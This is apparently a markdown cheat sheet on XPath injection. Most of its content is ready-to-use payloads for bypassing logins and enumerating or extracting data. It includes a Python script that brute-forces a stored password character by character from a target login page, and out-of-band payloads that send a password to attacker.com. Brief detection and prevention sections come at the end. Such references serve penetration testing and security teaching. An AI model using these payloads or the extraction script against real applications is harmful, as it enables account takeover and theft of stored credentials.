# XPath Injection

## Description
XPath Injection is an attack technique used to exploit applications that construct XPath queries from user input. Similar to SQL injection, attackers can manipulate XPath queries to bypass authentication, access unauthorized data, or enumerate database contents.

## XPath Basics

### XPath Syntax
```xpath
/root/element            # Absolute path
//element                # Select all matching elements
/root/element[@attr]     # Element with attribute
/root/element[text()='value']  # Element with text value
```

### Common Functions
```xpath
string-length(string)    # Length of string
substring(string,pos,len)  # Extract substring
contains(string, sub)    # Check if contains
starts-with(string, pre) # Check prefix
concat(str1, str2)       # Concatenate strings
count(nodes)             # Count nodes
position()               # Current position
name()                   # Element name
```

## Authentication Bypass

### Basic Bypass
```
# Original query: //users/user[username='USER' and password='PASS']

# Bypass with OR
username: ' or '1'='1
password: ' or '1'='1

# Results in: //users/user[username='' or '1'='1' and password='' or '1'='1']
```

### Bypass Payloads
```
' or '1'='1
' or ''='
' or 1=1 or '
' or 1]|//|/[
admin' or '
admin'--
' or name()='username' or 'x'='y
1' or '1' = '1
```

### Comment-Based Bypass
```
admin'--
admin'#
admin'/*
```

### Tautology
```
' or 'x'='x
' or 1=1 or 'x'='y
' or true() or '
```

## Data Extraction

### Enumerate Node Names
```
# Find root node name
' or name(/*[1])='a' or '

# Find child node names
' or name(//user[1])='username' or '
```

### Extract String Length
```
# Determine length of password
' or string-length(//user[1]/password)=8 or '
' or string-length(//user[position()=1]/password)>5 or '
```

### Extract Characters
```
# Extract first character
' or substring(//user[1]/password,1,1)='a' or '
' or substring(//user[1]/password,1,1)='b' or '

# Extract second character
' or substring(//user[1]/password,2,1)='x' or '
```

### Count Nodes
```
' or count(//user)>0 or '
' or count(//user)>1 or '
' and count(/*)=1 and '1'='1
```

## Blind XPath Injection

### Boolean-Based
```python
# Python script for extraction
import requests

url = "https://target.com/login"
password = ""
charset = "abcdefghijklmnopqrstuvwxyz0123456789"

for position in range(1, 20):
    for char in charset:
        payload = f"' or substring(//user[1]/password,{position},1)='{char}' or '"
        response = requests.post(url, data={"username": payload, "password": "x"})

        if "Welcome" in response.text:
            password += char
            print(f"Found: {password}")
            break

print(f"Password: {password}")
```

### Time-Based (if supported)
```
# Some XPath implementations may support delays
' or (if (substring(//user[1]/password,1,1)='a') then sleep(5) else 0) or '
```

## Out-of-Band Extraction

```xpath
' and doc('http://attacker.com/?data=' || //user[1]/password) or '
' or doc('http://10.10.10.10/share') or '
```

## Specific Attack Scenarios

### Login Bypass
```
# Username field
' or '1'='1' or '

# Password field
anything' or '1'='1
```

### Accessing Admin Account
```
admin' or '
' or name()='admin' or '
' or //user[username='admin']/password or '
```

### Extracting All Users
```
' or //user or '
' or //* or '
```

## XPath 2.0 Specific

```xpath
# String to codepoints
' or codepoints-to-string((115,101,99,114,101,116)) or '

# For-each expressions
' or (for $x in //user return $x/password) or '

# If-then-else
' or (if (//user[1]/role='admin') then 'yes' else 'no')='yes' or '
```

## Tools

### xcat
```bash
# https://github.com/nickmakesstuff/nickmakesstuff.github.io
# Automated XPath injection

xcat --method POST --target "http://target.com/login" \
     --parameter username --parameter-value "' or '1'='1"
```

### xxxpwn
```bash
# XPath injection scanner and exploiter
python xxxpwn.py -u "http://target.com/search?query=test"
```

### Manual Testing
```bash
# Test with curl
curl -X POST "https://target.com/login" \
     -d "username=' or '1'='1&password=x"
```

## Detection

### Error-Based
```
# Send malformed XPath
username='

# Look for errors:
# - "XPathException"
# - "Invalid XPath expression"
# - "XPath syntax error"
```

### Boolean-Based
```
# Compare responses
username=' or '1'='1  # True condition
username=' or '1'='2  # False condition

# Different responses indicate vulnerability
```

## Payloads Summary

### Authentication Bypass
```
' or '1'='1
' or ''='
' or 'x'='x
'] | //*[('
' or 1=1 or '
admin' or '
```

### Data Extraction
```
' or name(/*[1])='root' or '
' or string-length(//password)>5 or '
' or substring(//user[1]/pass,1,1)='a' or '
' or count(//user)>0 or '
```

### Special Characters
```
' " [ ] = @ / | : *
```

## Prevention

### Input Validation
```python
# Whitelist allowed characters
import re
if not re.match(r'^[a-zA-Z0-9_]+$', user_input):
    raise ValueError("Invalid input")
```

### Parameterized Queries
```python
# Use variables instead of string concatenation
# (if supported by XPath library)
query = "//users/user[username=$username and password=$password]"
result = xpath.execute(query, username=user, password=pwd)
```

### Escape Special Characters
```python
def escape_xpath(value):
    # Escape single quotes
    if "'" in value:
        value = "concat('" + value.replace("'", "',\"'\",'" ) + "')"
    else:
        value = "'" + value + "'"
    return value
```

## Testing Checklist

- [ ] Test basic bypass payloads
- [ ] Check for error messages revealing XPath
- [ ] Test boolean-based blind injection
- [ ] Enumerate node names
- [ ] Extract string lengths
- [ ] Extract data character by character
- [ ] Test XPath 2.0 specific functions
- [ ] Test out-of-band extraction

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection
- https://owasp.org/www-community/attacks/XPATH_Injection
- https://portswigger.net/kb/issues/00100600_xpath-injection
